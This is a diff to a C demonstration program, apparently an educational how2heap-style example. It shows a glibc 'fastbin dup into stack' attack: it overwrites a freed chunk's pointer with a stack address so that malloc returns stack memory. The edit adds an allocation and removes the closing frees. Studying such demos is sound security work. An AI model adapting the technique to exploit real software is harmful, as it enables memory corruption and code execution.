@@ -13,9 +13,11 @@ int main()
     fprintf(stderr, "Allocating 3 buffers.\n");
     int *a = malloc(8);
     int *b = malloc(8);
+    int *c = malloc(8);
 
     fprintf(stderr, "1st malloc(8): %p\n", a);
     fprintf(stderr, "2nd malloc(8): %p\n", b);
+    fprintf(stderr, "3rd malloc(8): %p\n", c);
 
     fprintf(stderr, "Freeing the first one...\n");
     free(a);
@@ -33,10 +35,9 @@ int main()
                     "We'll now carry out our attack by modifying data at %p.\n",
             a, b, a, a);
     unsigned long long *d = malloc(8);
-    void *e = malloc(8);
 
     fprintf(stderr, "1st malloc(8): %p\n", d);
-    fprintf(stderr, "2nd malloc(8): %p\n", e);
+    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
     fprintf(stderr, "Now the free list has [ %p ].\n", a);
     fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
                     "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
@@ -48,9 +49,6 @@ int main()
     fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
     *d = (unsigned long long) (((char *) &stack_var) - sizeof(d));
 
-    void *f, *stack;
-    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", f = malloc(8));
-    fprintf(stderr, "4th malloc(8): %p\n", stack = malloc(8));
-
-    free(d), free(e), free(stack);
+    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
+    fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
 }
